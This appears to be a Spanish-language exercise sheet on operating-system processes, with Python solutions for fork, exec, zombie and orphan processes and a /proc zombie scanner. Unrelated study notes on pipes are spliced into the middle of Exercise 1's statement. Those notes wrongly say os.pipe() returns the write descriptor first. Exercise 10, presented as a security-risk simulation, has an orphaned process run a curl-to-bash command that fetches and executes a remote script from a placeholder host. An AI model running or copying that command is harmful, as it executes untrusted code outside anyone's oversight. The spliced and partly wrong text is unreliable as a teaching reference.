# Ejercicios sobre Procesos en Sistemas Operativos

Este conjunto de ejercicios está diseñado para afianzar los conceptos clave sobre procesos, tal como se abordaron en el marco teórico. Comienza con tareas básicas y progresa hacia desafíos más complejos con implicaciones en seguridad, análisis forense y comportamiento anómalo del sistema.

---

## Sección 1: Enunciados de los Ejercicios

### Ejercicio 1: Identificación de procesos padre e hijo
Crea un programa que genere un proceso hijo
🔹 Pausa 1: Fundamentos de Pipes

1. ¿Qué es un pipe?
Un pipe es un mecanismo de comunicación que permite enviar datos de un proceso a otro en un flujo secuencial, como si se tratara de una tubería.

2. ¿Por qué los pipes son unidireccionales por defecto?
Porque están diseñados para comportarse como un archivo con un solo sentido: se escribe en un extremo y se lee en el otro. No están pensados para intercambio de ida y vuelta sin mecanismos adicionales.

3. ¿Qué ventajas tienen los pipes frente a otras formas de IPC?

    Son fáciles de usar

    No requieren configuración de red

    Son eficientes y livianos

    Están integrados al sistema operativo

🔹 Pausa 2: Implementación y ciclo de vida

1. ¿Qué devuelve os.pipe() y para qué sirve cada descriptor?
Devuelve dos descriptores de archivo: el primero para escribir (write_end), el segundo para leer (read_end).

2. ¿Qué ocurre si un proceso intenta leer de un pipe vacío?
Queda bloqueado hasta que haya datos disponibles o se cierre el otro extremo.

3. ¿Cómo se puede cerrar correctamente un pipe y por qué es importante?
Usando os.close(fd) en los extremos que no se usan. Es importante para:

    Liberar recursos del sistema

    Prevenir deadlocks y bloqueos innecesarios

    Señalar el fin de la comunicación (EOF)

🔹 Pausa 3: Comunicación unidireccional

1. ¿Por qué se cierra el extremo de escritura en el hijo?
Porque el hijo solo va a leer. Mantenerlo abierto puede causar que el padre espere indefinidamente al no recibir EOF.

2. ¿Qué pasa si ambos procesos intentan leer al mismo tiempo sin datos disponibles?
Ambos quedan bloqueados. Es fundamental diseñar bien el flujo de control.

3. ¿Cómo asegura este ejemplo que el padre reciba el mensaje antes de terminar?
Porque el padre escribe primero, el hijo lee y luego termina. El padre espera con os.wait().
🔹 Pausa 4: Comunicación bidireccional

1. ¿Por qué necesitamos dos pipes en la comunicación bidireccional?
Porque un solo pipe solo permite enviar datos en una dirección. Dos pipes permiten ida y vuelta (padre → hijo y hijo → padre).

2. ¿Qué pasaría si no cerramos los extremos de pipe no utilizados?
Podemos causar bloqueos, fugas de recursos o que los procesos no detecten el fin de los datos (no reciben EOF).

3. ¿Cómo podrías extender este ejemplo a más procesos hijos?

    Crear un pipe para cada hijo

    Manejar cada hijo por separado con os.fork()

    Sincronizar bien con os.wait() o señales

    Usar estructuras más avanzadas como colas si es necesario

🧾 RESUMEN DE LA UNIDAD: PIPES EN PYTHON
🧠 Conceptos clave

    Pipes: mecanismos unidireccionales de comunicación entre procesos (IPC).

    Usos comunes: pasar datos de un proceso padre a uno hijo y viceversa.

    Unidireccionalidad: para ida y vuelta se necesitan dos pipes.

    Bloqueo: leer de un pipe vacío bloquea el proceso.

    Cierre de extremos: fundamental para evitar deadlocks y liberar recursos.

    Sincronización: os.wait() se usa para evitar procesos zombies.

🛠️ Práctica realizada
Tema	Código desarrollado
Comunicación padre → hijo	os.pipe(), os.write(), os.read()
Comunicación bidireccional	Dos os.pipe(), cierre correcto de extremos
Manejo de errores	Control de extremos y orden de lectura/escritura
📌 Buenas prácticas reforzadas

    Cerrar los descriptores que no se usan

    No leer sin datos disponibles (evitar bloqueos)

    Documentar el código paso a paso

    Esperar a los hijos con os.wait()

📤 Próximos pasos sugeridos

Ya dominás los pipes clásicos en Python. Si querés seguir creciendo:

    📁 Avanzá a pipes con nombre (named pipes o FIFO)

    🌐 Luego, podés explorar sockets para comunicación en red

    💻 Más adelante, estudiar programación paralela y asíncrona

Pero por ahora: no saltes a eso hasta que estés 100% seguro con este tema.
Te recomiendo que prepares este contenido como entrega/documentación y lo compartas con tu profesor. utilizando `fork()` y que ambos (padre e hijo) impriman sus respectivos PID y PPID. El objetivo es observar la relación jerárquica entre ellos.

---

### Ejercicio 2: Doble bifurcación
Escribe un programa donde un proceso padre cree dos hijos diferentes (no en cascada), y cada hijo imprima su identificador. El padre deberá esperar a que ambos terminen.

---

### Ejercicio 3: Reemplazo de un proceso hijo con `exec()`
Haz que un proceso hijo reemplace su contexto de ejecución con un programa del sistema, por ejemplo, el comando `ls -l`, utilizando `exec()`.

---

### Ejercicio 4: Secuencia controlada de procesos
Diseña un programa donde se creen dos hijos de manera secuencial: se lanza el primero, se espera a que finalice, y luego se lanza el segundo. Cada hijo debe realizar una tarea mínima.

---

### Ejercicio 5: Proceso zombi temporal
Crea un programa que genere un proceso hijo que termine inmediatamente, pero el padre no debe recoger su estado de salida durante algunos segundos. Observa su estado como zombi con herramientas del sistema.

---

### Ejercicio 6: Proceso huérfano adoptado por `init`
Genera un proceso hijo que siga ejecutándose luego de que el padre haya terminado. Verifica que su nuevo PPID corresponda al proceso `init` o `systemd`.

---

### Ejercicio 7: Multiproceso paralelo
Construye un programa que cree tres hijos en paralelo (no secuenciales). Cada hijo ejecutará una tarea breve y luego finalizará. El padre debe esperar por todos ellos.

---

### Ejercicio 8: Simulación de servidor multiproceso
Imita el comportamiento de un servidor concurrente que atiende múltiples clientes creando un proceso hijo por cada uno. Cada proceso debe simular la atención a un cliente con un `sleep()`.

---

### Ejercicio 9: Detección de procesos zombis en el sistema
Escribe un script que recorra `/proc` y detecte procesos en estado zombi, listando su PID, PPID y nombre del ejecutable. Este ejercicio debe realizarse sin utilizar `ps`.

---

### Ejercicio 10: Inyección de comandos en procesos huérfanos (Análisis de riesgo)
Simula un escenario donde un proceso huérfano ejecuta un comando externo sin control del padre. Analiza qué implicaciones tendría esto en términos de seguridad o evasión de auditorías.

---

## Sección 2: Ejercicios Resueltos

### Ejercicio 1: Identificación de procesos padre e hijo

```python
import os

pid = os.fork()
if pid == 0:
    print("[HIJO] PID:", os.getpid(), "PPID:", os.getppid())
else:
    print("[PADRE] PID:", os.getpid(), "Hijo:", pid)
```

---

### Ejercicio 2: Doble bifurcación

```python
import os

for i in range(2):
    pid = os.fork()
    if pid == 0:
        print(f"[HIJO {i}] PID: {os.getpid()}  Padre: {os.getppid()}")
        os._exit(0)

for _ in range(2):
    os.wait()
```

---

### Ejercicio 3: Reemplazo de un proceso hijo con `exec()`

```python
import os

pid = os.fork()
if pid == 0:
    os.execlp("ls", "ls", "-l")  # Reemplaza el proceso hijo
else:
    os.wait()
```

---

### Ejercicio 4: Secuencia controlada de procesos

```python
import os
import time

def crear_hijo(nombre):
    pid = os.fork()
    if pid == 0:
        print(f"[HIJO {nombre}] PID: {os.getpid()}")
        time.sleep(1)
        os._exit(0)
    else:
        os.wait()

crear_hijo("A")
crear_hijo("B")
```

---

### Ejercicio 5: Proceso zombi temporal

```python
import os, time

pid = os.fork()
if pid == 0:
    print("[HIJO] Finalizando")
    os._exit(0)
else:
    print("[PADRE] No llamaré a wait() aún. Observa el zombi con 'ps -el'")
    time.sleep(15)
    os.wait()
```

---

### Ejercicio 6: Proceso huérfano adoptado por `init`

```python
import os, time

pid = os.fork()
if pid > 0:
    print("[PADRE] Terminando")
    os._exit(0)
else:
    print("[HIJO] Ahora soy huérfano. Mi nuevo padre será init/systemd")
    time.sleep(10)
```

---

### Ejercicio 7: Multiproceso paralelo

```python
import os

for _ in range(3):
    pid = os.fork()
    if pid == 0:
        print(f"[HIJO] PID: {os.getpid()}  Padre: {os.getppid()}")
        os._exit(0)

for _ in range(3):
    os.wait()
```

---

### Ejercicio 8: Simulación de servidor multiproceso

```python
import os, time

def atender_cliente(n):
    pid = os.fork()
    if pid == 0:
        print(f"[HIJO {n}] Atendiendo cliente")
        time.sleep(2)
        print(f"[HIJO {n}] Finalizado")
        os._exit(0)

for cliente in range(5):
    atender_cliente(cliente)

for _ in range(5):
    os.wait()
```

---

### Ejercicio 9: Detección de procesos zombis en `/proc`

```python
import os

def detectar_zombis():
    for pid in os.listdir('/proc'):
        if pid.isdigit():
            try:
                with open(f"/proc/{pid}/status") as f:
                    lines = f.readlines()
                    estado = next((l for l in lines if l.startswith("State:")), "")
                    if "Z" in estado:
                        nombre = next((l for l in lines if l.startswith("Name:")), "").split()[1]
                        ppid = next((l for l in lines if l.startswith("PPid:")), "").split()[1]
                        print(f"Zombi detectado → PID: {pid}, PPID: {ppid}, Nombre: {nombre}")
            except IOError:
                continue

detectar_zombis()
```

---

### Ejercicio 10: Inyección de comandos en procesos huérfanos

```python
import os, time

pid = os.fork()
if pid > 0:
    os._exit(0)  # El padre termina inmediatamente
else:
    print("[HIJO] Ejecutando script como huérfano...")
    os.system("curl http://example.com/script.sh | bash")  # Peligroso si no hay control
    time.sleep(3)
```

---

## Recomendaciones Finales

- Usa `htop`, `pstree`, y `ps -el` para observar los efectos de cada ejercicio.
- Ejecuta con permisos limitados y en entornos de prueba (máquinas virtuales o contenedores).
- Modifica los códigos para generar variantes: múltiples niveles de procesos, procesos que fallan, etc.

---